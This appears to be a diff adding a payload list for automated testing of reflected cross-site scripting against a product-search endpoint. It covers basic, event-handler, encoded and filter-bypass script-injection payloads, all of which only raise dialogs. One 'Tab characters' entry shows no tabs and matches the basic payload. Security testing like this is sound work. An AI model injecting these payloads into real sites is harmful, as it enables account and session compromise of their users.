@@ -1,0 +1,30 @@
+# Reflected XSS Payloads
+# Format: method|endpoint|payload|expected_code|attack_id|description
+
+# Basic Script Injection
+GET|/rest/products/search?q=<script>alert('XSS')</script>||200|xss_reflected_001|Basic alert
+GET|/rest/products/search?q=<script>alert(document.cookie)</script>||200|xss_reflected_002|Cookie theft attempt
+GET|/rest/products/search?q=<script>alert(document.domain)</script>||200|xss_reflected_003|Domain disclosure
+GET|/rest/products/search?q=<script>confirm('XSS')</script>||200|xss_reflected_004|Confirm dialog
+GET|/rest/products/search?q=<script>prompt('XSS')</script>||200|xss_reflected_005|Prompt dialog
+
+# Event Handler XSS
+GET|/rest/products/search?q=<img src=x onerror=alert('XSS')>||200|xss_event_001|Image onerror
+GET|/rest/products/search?q=<body onload=alert('XSS')>||200|xss_event_002|Body onload
+GET|/rest/products/search?q=<svg onload=alert('XSS')>||200|xss_event_003|SVG onload
+GET|/rest/products/search?q=<input onfocus=alert('XSS') autofocus>||200|xss_event_004|Input autofocus
+GET|/rest/products/search?q=<select onfocus=alert('XSS') autofocus>||200|xss_event_005|Select autofocus
+
+# Encoded XSS Payloads
+GET|/rest/products/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E||200|xss_encoded_001|URL encoded
+GET|/rest/products/search?q=&#60;script&#62;alert('XSS')&#60;/script&#62;||200|xss_encoded_002|HTML entity encoded
+GET|/rest/products/search?q=\x3cscript\x3ealert('XSS')\x3c/script\x3e||200|xss_encoded_003|Hex encoded
+GET|/rest/products/search?q=<script>alert(String.fromCharCode(88,83,83))</script>||200|xss_encoded_004|Char code encoding
+GET|/rest/products/search?q=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>||200|xss_encoded_005|Base64 encoded
+
+# Filter Bypass Techniques
+GET|/rest/products/search?q=<ScRiPt>alert('XSS')</ScRiPt>||200|xss_bypass_001|Case variation
+GET|/rest/products/search?q=<script>alert('XSS')</script>||200|xss_bypass_002|Tab characters
+GET|/rest/products/search?q=<scr<script>ipt>alert('XSS')</scr</script>ipt>||200|xss_bypass_003|Nested tags
+GET|/rest/products/search?q=<<script>script>alert('XSS')<<script>/script>||200|xss_bypass_004|Double angle brackets
+GET|/rest/products/search?q=<script>/*comment*/alert('XSS')/*comment*/</script>||200|xss_bypass_005|Comment obfuscation
